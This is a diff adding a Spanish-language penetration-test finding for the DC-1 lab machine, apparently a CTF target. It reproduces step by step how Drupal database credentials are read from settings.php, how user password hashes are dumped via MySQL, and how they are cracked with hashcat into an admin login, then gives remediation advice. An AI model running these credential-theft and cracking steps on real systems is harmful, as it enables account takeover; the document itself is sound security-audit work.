@@ -1,0 +1,125 @@
+ID: PT-003
+Nombre: Credenciales de Drupal almacenadas con hash débil (contraseña crackeada)
+Activo afectado: DC-1 (192.168.18.130, /user/login)
+Servicio: Drupal 7 — tabla users (MySQL)
+Severidad: High (CVSS 7.5)
+Vector CVSS: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+CVE: N/A (configuración insegura)
+CWE-521: Weak Password Requirements
+CWE-916: Use of Password Hash With Insufficient Computational Effort
+
+Descripción técnica:
+La tabla `users` de la base de datos Drupal contiene hashes de
+contraseñas de los usuarios admin y Fred. Se obtuvieron las
+credenciales de MySQL desde settings.php y se accedió a la tabla.
+El hash de admin se crackeó exitosamente con hashcat usando un
+diccionario de contexto CTF.
+
+Credencial comprometida:
+- Usuario: admin
+- Contraseña: 53cr3t
+
+Evidencia:
+- mysql -u dbuser -pR0ck3t drupaldb -e "SELECT name,pass FROM users;"
+- hashcat -m 7900 -a 0 hashes_clean.txt /tmp/dc1_words.txt
+- Resultado: $S$DvQI6Y600...:53cr3t
+
+
+Procedimiento de reproducción:
+
+Fase A — Obtención de las credenciales de MySQL:
+1. Obtener shell como www-data mediante Drupalgeddon (PT-001).
+2. Leer settings.php:
+   $ grep -E "username|password|database" /var/www/sites/default/settings.php
+   Resultado:
+     'database' => 'drupaldb',
+     'username' => 'dbuser',
+     'password' => 'R0ck3t',
+
+Fase B — Extracción de hashes desde MySQL:
+3. Conectarse a la base de datos:
+   $ mysql -u dbuser -pR0ck3t -e "SELECT name,pass FROM drupaldb.users;"
+   Resultado:
+     +-------+---------------------------------------------------------+
+     | name  | pass                                                    |
+     +-------+---------------------------------------------------------+
+     | admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR |
+     | Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |
+     +-------+---------------------------------------------------------+
+
+Fase C — Crackeo con Hashcat:
+4. Crear wordlist de contexto CTF (/tmp/dc1_words.txt):
+   $ cat > /tmp/dc1_words.txt << 'EOF'
+   drupal
+   Drupal
+   drupal7
+   dc1
+   dc-1
+   DC1
+   DrupalDC1
+   admin
+   admin123
+   password
+   password1
+   53cr3t
+   secret
+   letmein
+   welcome
+   changeme
+   P@ssw0rd
+   drupal123
+   drupaladmin
+   R0ck3t
+   EOF
+
+5. Guardar los hashes (sin nombre de usuario) en hashes_clean.txt:
+   $ awk -F: '{print $2}' hashes.txt > hashes_clean.txt
+
+6. Ejecutar hashcat:
+   $ hashcat -m 7900 -a 0 hashes_clean.txt /tmp/dc1_words.txt
+
+7. Resultado: $S$DvQI6Y600...:53cr3t
+
+
+Figura 13: Resultado de hashcat — hash de admin crackeado
+
+
+
+Figura 14: Formulario de login con credenciales admin
+
+
+Figura 15: Panel administrativo tras login exitoso
+
+
+Fase D — Validación de acceso:
+8. Iniciar sesión en http://192.168.18.130/user/login con admin:53cr3t.
+
+9. Verificar acceso administrativo (mensaje "Hello admin").
+
+Estado: Confirmado.
+
+Impacto técnico:
+Acceso administrativo al CMS Drupal. Permite:
+- Login como admin en /user/login.
+- Modificar contenido, usuarios y configuraciones.
+- Habilitar el módulo PHP Filter y ejecutar código PHP arbitrario.
+- Instalar/editar themes y módulos con código malicioso.
+
+Impacto para la organización:
+Un atacante con las credenciales del CMS puede manipular todo el
+portal web, inyectar código, exfiltrar datos de usuarios y
+comprometer la integridad del sitio.
+
+Recomendación:
+- Cambiar inmediatamente la contraseña del usuario admin.
+- Aplicar política de contraseñas fuertes (mínimo 12 caracteres,
+  complejidad, no palabras de diccionario).
+- Migrar de phpass a bcrypt/argon2 con costo adecuado.
+- Implementar MFA para cuentas administrativas.
+- Bloquear /user/login desde direcciones no autorizadas.
+- Auditar logs de Drupal por inicios de sesión sospechosos.
+
+Referencias:
+- https://cwe.mitre.org/data/definitions/521.html
+- https://cwe.mitre.org/data/definitions/916.html
+- https://www.drupal.org/docs/security-team
